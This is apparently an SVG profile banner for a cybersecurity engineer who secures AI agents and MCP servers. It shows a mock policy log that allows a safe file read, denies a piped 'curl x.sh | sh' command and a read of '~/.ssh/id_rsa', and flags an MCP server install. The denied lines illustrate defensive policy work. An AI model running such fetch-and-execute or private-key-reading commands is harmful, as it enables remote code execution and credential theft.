<svg xmlns="http://www.w3.org/2000/svg" width="1200" height="360" viewBox="0 0 1200 360" role="img" aria-labelledby="t d">
<title id="t">I secure AI agents and MCP servers</title>
<desc id="d">Kiell Tampubolon, cybersecurity engineer. A policy log allows a safe file read and denies a shell pipe, an SSH key read, and flags a risky MCP server.</desc>
<defs>
  <linearGradient id="bg" x1="0" y1="0" x2="1" y2="1"><stop offset="0" stop-color="#0a0e13"/><stop offset="1" stop-color="#0d1a1c"/></linearGradient>
  <radialGradient id="glow" cx="0.78" cy="0.45" r="0.45"><stop offset="0" stop-color="#2ee6a6" stop-opacity=".16"/><stop offset="1" stop-color="#2ee6a6" stop-opacity="0"/></radialGradient>
  <linearGradient id="acc" x1="0" y1="0" x2="1" y2="0"><stop offset="0" stop-color="#5ff2c0"/><stop offset="1" stop-color="#3fb6f2"/></linearGradient>
  <pattern id="dots" width="22" height="22" patternUnits="userSpaceOnUse"><circle cx="1" cy="1" r="1" fill="#ffffff" fill-opacity=".05"/></pattern>
  <clipPath id="c"><rect width="1200" height="360" rx="16"/></clipPath>
</defs>
<style>
  .hl { animation: step 8s steps(1,end) infinite; }
  @keyframes step { 0% { transform: translateY(0px) } 25% { transform: translateY(50px) } 50% { transform: translateY(100px) } 75% { transform: translateY(150px) } }
  .live { animation: pulse 1.6s ease-in-out infinite; }
  @keyframes pulse { 50% { opacity: .25 } }
  @media (prefers-reduced-motion: reduce) { .hl, .live { animation: none } }
</style>
<g clip-path="url(#c)">
  <rect width="1200" height="360" fill="url(#bg)"/>
  <rect width="1200" height="360" fill="url(#dots)"/>
  <rect width="1200" height="360" fill="url(#glow)"/>
</g>
<rect x=".5" y=".5" width="1199" height="359" rx="16" fill="none" stroke="#1d2a30"/>

<text x="56" y="84" font-family="ui-monospace,SFMono-Regular,'Cascadia Code',Consolas,Menlo,monospace" font-size="13" fill="#5ff2c0" letter-spacing="2.2">KIELL TAMPUBOLON  ·  CYBERSECURITY ENGINEER</text>
<text x="54" y="156" font-family="-apple-system,BlinkMacSystemFont,'Segoe UI',Helvetica,Arial,sans-serif" font-size="56" font-weight="800" fill="#f3f6f8" letter-spacing="-1.2">I secure AI agents</text>
<text x="54" y="222" font-family="-apple-system,BlinkMacSystemFont,'Segoe UI',Helvetica,Arial,sans-serif" font-size="56" font-weight="800" fill="#f3f6f8" letter-spacing="-1.2">and <tspan fill="url(#acc)">MCP servers.</tspan></text>
<text x="56" y="268" font-family="-apple-system,BlinkMacSystemFont,'Segoe UI',Helvetica,Arial,sans-serif" font-size="19" fill="#93a1aa">Policy boundaries, supply-chain scanning and auth testing</text>
<text x="56" y="294" font-family="-apple-system,BlinkMacSystemFont,'Segoe UI',Helvetica,Arial,sans-serif" font-size="19" fill="#93a1aa">for the tools that agents call.</text>
<path d="M57 323l4 4 8-9" fill="none" stroke="#3fb950" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"/>
<text x="78" y="328" font-family="-apple-system,BlinkMacSystemFont,'Segoe UI',Helvetica,Arial,sans-serif" font-size="14.5" fill="#c3ccd2">Fixes merged in NVIDIA SkillSpector, Tencent AI-Infra-Guard and 7 more</text>

<rect x="700" y="52" width="452" height="276" rx="12" fill="#0b1217" fill-opacity=".92" stroke="#22323a"/>
<text x="726" y="86" font-family="ui-monospace,SFMono-Regular,'Cascadia Code',Consolas,Menlo,monospace" font-size="13" fill="#6e7d86">agent → tool call → policy</text>
<circle class="live" cx="1084" cy="81" r="4" fill="#3fb950"/>
<text x="1126" y="86" text-anchor="end" font-family="ui-monospace,SFMono-Regular,'Cascadia Code',Consolas,Menlo,monospace" font-size="12" fill="#6e7d86">live</text>
<path d="M716 100H1136" stroke="#1d2a30"/>
<rect class="hl" x="712" y="108" width="428" height="40" rx="8" fill="#5ff2c0" fill-opacity=".07" stroke="#5ff2c0" stroke-opacity=".25"/>
<g class="row r0">
  <text x="726" y="133" font-family="ui-monospace,SFMono-Regular,'Cascadia Code',Consolas,Menlo,monospace" font-size="15" fill="#6e7d86">›</text>
  <text x="744" y="133" font-family="ui-monospace,SFMono-Regular,'Cascadia Code',Consolas,Menlo,monospace" font-size="15" fill="#d6dee3">read_file("docs/README.md")</text>
  <rect x="1057.0" y="115" width="69.0" height="26" rx="13" fill="#0f2a1a" stroke="#3fb950" stroke-opacity=".55"/>
  <text x="1091.5" y="133" text-anchor="middle" font-family="ui-monospace,SFMono-Regular,'Cascadia Code',Consolas,Menlo,monospace" font-size="12.5" font-weight="700" fill="#3fb950" letter-spacing=".5">ALLOW</text>
</g>
<g class="row r1">
  <text x="726" y="183" font-family="ui-monospace,SFMono-Regular,'Cascadia Code',Consolas,Menlo,monospace" font-size="15" fill="#6e7d86">›</text>
  <text x="744" y="183" font-family="ui-monospace,SFMono-Regular,'Cascadia Code',Consolas,Menlo,monospace" font-size="15" fill="#d6dee3">shell.run("curl x.sh | sh")</text>
  <rect x="1065.6" y="165" width="60.4" height="26" rx="13" fill="#2d1214" stroke="#f85149" stroke-opacity=".55"/>
  <text x="1095.8" y="183" text-anchor="middle" font-family="ui-monospace,SFMono-Regular,'Cascadia Code',Consolas,Menlo,monospace" font-size="12.5" font-weight="700" fill="#f85149" letter-spacing=".5">DENY</text>
</g>
<g class="row r2">
  <text x="726" y="233" font-family="ui-monospace,SFMono-Regular,'Cascadia Code',Consolas,Menlo,monospace" font-size="15" fill="#6e7d86">›</text>
  <text x="744" y="233" font-family="ui-monospace,SFMono-Regular,'Cascadia Code',Consolas,Menlo,monospace" font-size="15" fill="#d6dee3">read_file("~/.ssh/id_rsa")</text>
  <rect x="1065.6" y="215" width="60.4" height="26" rx="13" fill="#2d1214" stroke="#f85149" stroke-opacity=".55"/>
  <text x="1095.8" y="233" text-anchor="middle" font-family="ui-monospace,SFMono-Regular,'Cascadia Code',Consolas,Menlo,monospace" font-size="12.5" font-weight="700" fill="#f85149" letter-spacing=".5">DENY</text>
</g>
<g class="row r3">
  <text x="726" y="283" font-family="ui-monospace,SFMono-Regular,'Cascadia Code',Consolas,Menlo,monospace" font-size="15" fill="#6e7d86">›</text>
  <text x="744" y="283" font-family="ui-monospace,SFMono-Regular,'Cascadia Code',Consolas,Menlo,monospace" font-size="15" fill="#d6dee3">install("some-mcp-server")</text>
  <rect x="1005.4" y="265" width="120.6" height="26" rx="13" fill="#2b2410" stroke="#e3b341" stroke-opacity=".55"/>
  <text x="1065.7" y="283" text-anchor="middle" font-family="ui-monospace,SFMono-Regular,'Cascadia Code',Consolas,Menlo,monospace" font-size="12.5" font-weight="700" fill="#e3b341" letter-spacing=".5">FLAG MCP002</text>
</g>
</svg>